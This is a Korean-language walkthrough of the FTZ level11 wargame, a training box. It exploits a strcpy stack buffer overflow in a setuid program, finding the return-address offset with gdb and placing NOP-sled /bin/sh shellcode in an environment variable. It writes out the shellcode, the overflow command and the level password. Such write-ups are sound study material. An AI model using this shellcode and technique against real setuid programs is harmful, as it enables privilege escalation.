# FTZ level11

ls 명령어를 사용해서 무엇이 있는지 확인해 보자.

__attackme , hint , public_html , tmp__ 

일단은 cat hint 명령어를 사용하여 힌트를 확인해 보자.  

```
#include <stdio.h>
#include <stdlib.h>
 
int main( int argc, char *argv[] )
{
	char str[256];

 	setreuid( 3092, 3092 );
	strcpy( str, argv[1] );
	printf( str );
} 
```

코드가 나오는데 str에 [256]버퍼를 담고 __setreuid( 3092, 3092 );__ setuid 설정 strcpy로 인자를 복사해 str에 넣어 출력하는 코드이다.  

이것은 버퍼오버플로우 문제이다. __strcpy__ 함수에는 큰 취약점이 하나 존재하는데 입력된 값의 버퍼를 확인하지 않고 복사해버리는 것이다. 그것을 이용하여 BOF를 하는 문제이다.

그럼 return address 까지의 버퍼를 찾아야 하기 때문에 gdb를 이용할 것이다.

___

gdb를 확인해보면 중간 코드에 

```
0x08048499 <main+41>:	lea    eax,[ebp-264]
0x0804849f <main+47>:	push   eax
0x080484a0 <main+48>:	call   0x804835c <strcpy>
```

이러 코드가 보일 것이다. 잘 생각해보면 버퍼가 코드에 비해 8더 많다는 것을 확인 할 수 있을 것이다. 8은 메모리 보호 기법에 의한 더미이다.

__메모리 보호 기법에 잠깐 설명하면 운영 체제에서 실행하고 있는 프로세스가 자신에게 할당되지 않은 영역의 메모리에 접근하는 것이 메모리 보호의 주된 목적이다.__

__이를 통해 프로세스 내의 버그가 다른 프로세스의 동작에 영향을 미치는 것을 예방하며 악성 소프트웨어가 시스템에서 허가되지 않은 접근 권한을 갖고 시스템에 영향을 끼치는 것을 막아준다.__

그럼 return address는 어디에 있을까?

| str [264]      | 할당된 버퍼이다. |
| -------------- | ---------------- |
| ebp            | base pointer     |
| return address | 여기가 그곳이다. |

조잡하지만 위를 잠깐 보자. 각 한 칸을 4바이트씩 차지 한다. 그럼 주소는 268이후에 있지 않을까?



___

이제 한번 시작해 보자.

NOP를 이용하여 풀것이기 때문에 환경변수를 이용할 것이다.

__NOP(0x90)은 어셈블리 언어로 아무것도 하지 않는 명령어이다. 그래서 NOP으로 쉘 코드의 앞뒤를 감싸게 되면 buf의 정확한 주소가 아닌 근사값의 주소여도 결국 쉘 코드가 실행될 수 있게된다.__

```
export EGG=`python -c 'print "\x90" * 1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

환경변수에 쉘코드를 집어 넣고 넉넉하게 NOP를 1000번 입력할것이다. 

return address에는 쉘 코드가 아닌 주소가 들어가야 해야하다. 그러니 아주 짧은 코드를 짤 것이다.

cd tmp 명령어로 들어가자 tmp에서 코드를 짜보자

```
#include <stdio.h>

int main() {
        printf("%p\n", getenv("EGG"));
}
```

이런 씩의 코드이다. __getenv__ 함수는 환경 변수의 값을 가져오는 함수이다.

gcc를 이용하여 컴파일 후 실행을 해보면 주소값이 나온다.

나의 주소값은 __0xbffff4b4__이런게 나왔다. 메모리에 저장 되는 주소가 무작위이다 보니까 다 똑같이 나올 수 없다. 이제 대입만 하면 끝이 난다.

___

자 이제 원래 home으로 돌아와서 attackme 인자에 대입을 해보자.

```
./attackme `python -c 'print "A" * 268 + "\xb4\xf4\xff\xbf"'`
```

__"A" * 268__ 이부분은 버퍼와 ebp를 덮기 위해 아무 문자열이나 넣어준것이고 그 이후 return address에 쉘코드 주소값을 리틀 엔디안으로 넣어주면 쉘이 실행이된다. 만약 잘 모르겠다면 쉘 실행이후 __whoami__ 명령을 입력하면     level12라고 나온다. 

이제 my-pass 명령을 입력하면 __Level12 Password is "it is like this".__ 라면서 패스워가 나타난다.

